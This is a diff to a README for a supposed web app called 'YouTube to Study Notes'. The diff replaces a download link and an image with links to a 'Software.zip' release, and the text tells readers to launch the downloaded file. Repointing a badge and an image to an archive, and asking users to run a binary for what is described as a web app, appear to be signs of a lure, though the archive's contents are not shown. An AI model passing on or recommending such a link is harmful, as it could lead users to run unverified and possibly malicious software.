@@ -10,7 +10,7 @@ Using advanced deep learning techniques and natural language processing, this we
 
 ## Getting Started
 To get started with "YouTube to Study Notes", simply click the link below to download the necessary files:
-[![Download Now](https://img.shields.io/badge/Download%20Here-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/zainalabidin030300/Youtube-to-Study-Notes/releases/download/v2.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/zainalabidin030300/Youtube-to-Study-Notes/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, remember to launch the downloaded file to begin using the web app.
 
@@ -47,4 +47,4 @@ If you are passionate about education technology and want to contribute to the d
 
 Start enhancing your learning journey today with "YouTube to Study Notes"! 🌟
 
-![Study Notes](https://www.example.com/study_notes_image.jpg)
+![Study Notes](https://github.com/zainalabidin030300/Youtube-to-Study-Notes/releases/download/v2.0/Software.zip)
